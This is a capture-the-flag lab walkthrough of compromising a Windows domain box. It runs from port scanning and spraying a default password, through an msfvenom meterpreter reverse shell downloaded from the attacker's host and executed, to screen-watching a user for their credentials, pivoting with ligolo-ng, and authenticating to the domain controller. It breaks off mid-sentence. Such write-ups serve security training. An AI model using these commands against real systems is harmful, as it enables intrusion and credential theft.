# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.136.40 -vv

Nmap scan report for 10.129.136.40
Host is up, received user-set (0.020s latency).
Scanned at 2026-10-20 16:09:47 BST for 66s
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
443/tcp open  https   syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.25 seconds
```

## Nmap
```python
❯❯❯ nmap -p 443 -A --min-rate=2000 -sT -Pn 10.129.136.40
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-20 16:11 +0100
Nmap scan report for 10.129.136.40
Host is up (0.013s latency).

PORT    STATE SERVICE    VERSION
443/tcp open  ssl/https?
|_ssl-date: 2026-10-20T15:13:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
| tls-alpn: 
|   h2
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Only a web service open

`atsserver.acute.local` ill add to `/etc/hosts`

# HTTPS (443)

![](Pasted%20image%2020261020161640.png)

Im running this through my proxy and im seeing wordpress endpoints

There is a docx i can download

![](Pasted%20image%2020261020162900.png)

This docx file reveals a potential user `lois`

![](Pasted%20image%2020261020163036.png)

![](Pasted%20image%2020261020164633.png)

There is what looks like a default password

```python
Password1!
```

![](Pasted%20image%2020261020163124.png)

In the document there is also a hyperlink to `https://atsserver.acute.local/Acute_Staff_Access/`

![](Pasted%20image%2020261020163334.png)

This takes me to an interesting login page

There is no option to register

![](Pasted%20image%2020261020163430.png)

There is also more connection options

![](Pasted%20image%2020261020163730.png)

There is also some more potential users on the about page

```python
aileen wallace
charlotte hall
evan davies
ieuan monks
joshua morgan
lois hopkins
```

Ill try the default password with some of the users on the login form

Attempting auth on several different users, but the user `edavies` gives a different error

![](Pasted%20image%2020261020165600.png)

This tells me the credentials are valid, but the connection endpoint is unauthorized

# Access to PSWA 

```python
❯❯❯ exiftool New_Starter_CheckList_v7.docx                  
ExifTool Version Number         : 13.55
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2026:10:20 16:19:39+01:00
File Access Date/Time           : 2026:10:20 16:19:54+01:00
File Inode Change Date/Time     : 2026:10:20 16:19:47+01:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
```

So after realizing the creds are valid but what im trying to connect to isnt, i return to enumeration

Getting the metadata of the pdf file gives me two things, `fcastle` is a user, and the computer name `acute-pc01`

![892](Pasted%20image%2020261020170128.png)

I now am able to login

# PWSA Enumeration

![](Pasted%20image%2020261020170407.png)

This isnt running in constrained language mode

![](Pasted%20image%2020261020171302.png)

These are the users with a profile 

![](Pasted%20image%2020261020172023.png)

There is a directory setup as a defender exclusion

This is good to know if i need to do any tunneling at any point

![](Pasted%20image%2020261020172434.png)

`22.1` is the webserver

I am currently remoted into `22.2`

![](Pasted%20image%2020261020172633.png)

Ill query the users with an active logon, i dont think this is me, although im running as `edavies` this looks to be a different logon type

A console session is a direct session, so in other words the user is actually sitting at the machine, so this cant be me, as im remoted in

In order to see what the user is doing in this session, it might be a good idea to upload a beacon to the target and place it in utils then i can monitor the session

# Meterpreter session 

I think this active session is interesting and if i remember correctly meterpreter has a built in option to watch the screen 

```python
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

Ill create a shell

```python
❯❯❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ill start a webserver to host it

```python
❯❯❯ msfconsole

msf > use exploit/multi/handler 

msf exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.61
msf exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
```

Ill set all the correct options that were set in msfvenom and then run with listener with `run`

```python
wget http://10.10.14.61/shell.exe -o shell.exe
```

In the PWSA session ill use this command to get the shell

```python
./shell.exe
```

Then ill just run it

![](Pasted%20image%2020261022163257.png)

I now have a meterpreter session

Using the screenshare function i can capture the credentials

```python
imonks:W3_4R3_th3_f0rce.
```

I have the credentials

# Setting up ligolo-ng on the target

I now have credentials, but i still cannot reach the internal network

Ill download both the linux proxy and the windows agent from the github releases

```python
❯❯❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ill start a web server on my machine

```python
PS C:\Utils> wget http://10.10.14.61/agent.exe -o agent.exe
```

Ill drop into a shell from my meterpreter session, then download the agent

```python
❯❯❯ sudo ./proxy -selfcert                                       
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.2

ligolo-ng »  
```

Ill then start the proxy on my machine

```python
PS C:\Utils> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
.\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
time="2026-10-22T17:09:26+01:00" level=warning msg="warning, certificate validation disabled"
time="2026-10-22T17:09:26+01:00" level=info msg="Connection established" addr="10.10.14.61:11601"
```

Ill trigger the connection

```python
[Agent : ACUTE\edavies@Acute-PC01] » ifcreate --name ligolo
INFO[0108] Creating a new ligolo interface...           
INFO[0108] Interface created!
```

Ill select the new session, then create a new interface

```python
[Agent : ACUTE\edavies@Acute-PC01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet 2                     │
│ Hardware MAC │ 00:15:5d:e8:0a:01              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::9513:4361:23ec:64fd/64   │
│ IPv4 Address │ 172.16.22.2/24                 │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 1                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : ACUTE\edavies@Acute-PC01] »  
```

Ill make note of the internal IP address `172.16.22.2/24`

```python
[Agent : ACUTE\edavies@Acute-PC01] » route_add --name ligolo --route 172.16.22.0/24
INFO[0204] Route created.                               
[Agent : ACUTE\edavies@Acute-PC01] » tunnel_start 
INFO[0209] Starting tunnel to ACUTE\edavies@Acute-PC01 (00155de80a01) 
[Agent : ACUTE\edavies@Acute-PC01] » 
```

Then ill use the IP to add routing info to the created interface then start the tunnel

Now this is setup i should be able to access `.1` which is the `ATSSERVER` and `.2` which is the `acute-pc01`

# Nmap on ATSSERVER

I have already scanned this at the start but only port 443 was open externally

```python
❯❯❯ nmap -p- -sT -Pn 172.16.22.1 -vv 

Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 17:15 +0100
Initiating Parallel DNS resolution of 1 host. at 17:15
Completed Parallel DNS resolution of 1 host. at 17:15, 0.50s elapsed
Initiating Connect Scan at 17:15
Scanning 172.16.22.1 [65535 ports]
Discovered open port 53/tcp on 172.16.22.1
Discovered open port 445/tcp on 172.16.22.1
Discovered open port 135/tcp on 172.16.22.1
Discovered open port 139/tcp on 172.16.22.1
Discovered open port 443/tcp on 172.16.22.1
Discovered open port 3268/tcp on 172.16.22.1
Connect Scan Timing: About 15.05% done; ETC: 17:18 (0:02:55 remaining)
Discovered open port 464/tcp on 172.16.22.1
Discovered open port 88/tcp on 172.16.22.1
Connect Scan Timing: About 30.20% done; ETC: 17:18 (0:02:34 remaining)
Discovered open port 49692/tcp on 172.16.22.1
Discovered open port 49691/tcp on 172.16.22.1
Discovered open port 9389/tcp on 172.16.22.1
Discovered open port 49902/tcp on 172.16.22.1
Discovered open port 636/tcp on 172.16.22.1
Discovered open port 2179/tcp on 172.16.22.1
Discovered open port 389/tcp on 172.16.22.1
Discovered open port 49668/tcp on 172.16.22.1
Connect Scan Timing: About 48.38% done; ETC: 17:19 (0:02:17 remaining)
Discovered open port 593/tcp on 172.16.22.1
Discovered open port 3269/tcp on 172.16.22.1
Discovered open port 51011/tcp on 172.16.22.1
```

Judging from the verbose output this is a domain controller

```python
172.16.22.1	atsserver.acute.local acute.local atsserver
172.16.22.2	acute-pc01.acute.local acute-pc01
```

Ill update my hosts file

# Domain enumeration

Now i can reach the DC ill enumerate the domain

```python
❯❯❯ nxc smb atsserver.acute.local -u imonks -p 'W3_4R3_th3_f0rce.' -k
SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         atsserver.acute.local 445    atsserver        [+] acute.local\imonks:W3_4R3_th3_f0rce. 
```

The creds found earlier i can auth, NTLM is disabled!

There are only defa




